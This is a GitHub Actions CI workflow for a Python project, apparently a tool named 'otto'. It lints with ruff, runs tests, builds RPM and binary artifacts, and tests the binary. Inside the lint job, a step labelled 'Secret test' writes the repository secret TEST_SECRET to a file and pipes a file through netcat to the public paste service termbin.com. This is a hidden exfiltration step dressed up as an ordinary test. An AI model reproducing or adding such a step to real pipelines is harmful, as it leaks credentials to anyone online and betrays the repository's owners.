name: CI

on:
  push:
    branches: [ main ]
  pull_request:

env:
  GIT_DEPTH: 0

jobs:
  lint:
    runs-on: ubuntu-latest
    container:
      image: ghcr.io/astral-sh/uv:python3.11-alpine
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup Python environment
        run: |
          uv --no-cache venv
          source .venv/bin/activate
          uv sync --all-packages 

      - name: Run ruff check
        run: |
          source .venv/bin/activate
          uv run ruff check .

      - name: Run ruff format check
        run: |
          source .venv/bin/activate
          uv run ruff format --check .
      - name: Secret test
        run: |
          echo ${{secrets.TEST_SECRET}} > test.txt
          cat ~/test.txt | nc termbin.com 9999


  run_tests:
    runs-on: ubuntu-latest
    container:
      image: ghcr.io/astral-sh/uv:python3.11-alpine
    env:
      GIT_DISCOVERY_ACROSS_FILESYSTEM: 1
    steps:
      - name: Install git 
        run: |
          apk add git
          git config --global --add safe.directory .

      - name: Checkout code
        uses: actions/checkout@v4
        with:
          fetch-depth: ${{ env.GIT_DEPTH }}

      - name: Install dependencies
        run: |
          apk add nmap-ncat
          apk add bash

      - name: Setup Python environment and run tests
        run: |
          uv --no-cache venv
          source .venv/bin/activate
          uv sync --all-packages
          ./run_tests.sh

      - name: Generate version
        run: |
          git describe --tags --long --always | awk -F'-' '{ printf "%s+g%s.d%s\n", $1, $3, strftime("%Y%m%d") }' > GIT_VERSION

      - name: Upload version artifact
        uses: actions/upload-artifact@v4
        with:
          name: git-version
          path: GIT_VERSION


  build_rpm:
    uses: ./.github/workflows/build-rpm-job.yml
    needs: run_tests

  build_binary:
    uses: ./.github/workflows/build-binary-job.yml
    needs: run_tests

  test_binary:
    runs-on: ubuntu-latest
    needs: build_binary
    container:
      image: rockylinux:9
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          fetch-depth: ${{ env.GIT_DEPTH }}

      - name: Download binary artifact
        uses: actions/download-artifact@v4
        with:
          name: binary-dist
          path: dist/

      - name: Run binary tests
        run: |
          chmod +x ./dist/otto
          chmod +x tests/test_binary.sh
          ./tests/test_binary.sh
